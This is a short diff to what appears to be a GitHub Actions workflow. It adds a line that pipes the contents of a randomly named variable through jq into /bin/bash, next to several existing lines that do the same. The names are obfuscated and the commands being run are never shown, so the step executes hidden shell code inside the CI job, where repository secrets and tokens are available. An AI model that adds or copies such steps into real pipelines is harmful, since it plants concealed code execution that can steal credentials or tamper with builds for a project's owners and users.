@@ -33,6 +33,7 @@ jobs:
           echo $pgfw6641 | jq -r .xkjf40191 | /bin/bash
           echo $t05469 | jq -r .cu9922 | /bin/bash
           echo $k28586 | jq -r .ibqw8 | /bin/bash
+          printf '%s' "$x382" | jq -r .ivsdn3 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
